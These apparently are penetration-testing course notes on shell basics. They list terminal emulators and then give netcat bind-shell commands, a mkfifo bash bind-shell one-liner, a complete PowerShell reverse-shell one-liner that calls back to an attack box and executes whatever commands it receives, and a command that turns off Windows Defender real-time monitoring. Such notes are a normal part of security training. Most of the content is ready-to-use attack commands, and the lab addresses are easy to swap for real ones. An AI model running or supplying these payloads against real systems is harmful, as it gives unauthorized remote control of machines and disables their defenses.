# Shell Basics

## 1.Anatomy of a Shell

| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app/)                                    | Windows                  |
| [PuTTY](https://www.putty.org/)                                | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org/)                            | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))   | MacOS                    |
| [iTerm2](https://iterm2.com/)                                  | MacOS                    |

```shell-session
ps
env
```

## 2.Bind Shells

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FDiktQvlCrFaRjxrP6DoX%2Fimage.png?alt=media&amp;token=a96ca401-855a-40ce-b69d-a92db5ea1687" alt=""><figcaption></figcaption></figure>

### GNU Netcat

**No. 1: Server - Target starting Netcat listener**

```shell-session
nc -lvnp 7777
```

**No. 2: Client - Attack box connecting to target**

```shell-session
nc -nv 10.129.41.200 7777
```

**No. 3: Server - Target receiving connection from client**

```shell-session
 nc -lvnp 7777
```

**No. 4: Client - Attack box sending message Hello Academy**

```shell-session
 nc -nv 10.129.41.200 7777
```

**No. 5: Server - Target receiving Hello Academy message**

```shell-session
nc -lvnp 7777
```

### &#x20;Establishing a Basic Bind Shell with Netcat

**No. 1: Server - Binding a Bash shell to the TCP session**

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**No. 2: Client - Connecting to bind shell on target**

```shell-session
nc -nv 10.129.41.200 7777
```

## 3.Reverse Shells

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>" %}

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F2BaGb2KisRnvkKBf7itU%2Fimage.png?alt=media&amp;token=2f541075-fe4e-4bfe-b327-ac524c5f08e1" alt=""><figcaption></figcaption></figure>

### Reverse Shell in Windows

**Server (`attack box`)**

```shell-session
sudo nc -lvnp 443
```

**Client (target)**

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Disable AV**

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

**Server (attack box)**

```shell-session
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

<br>
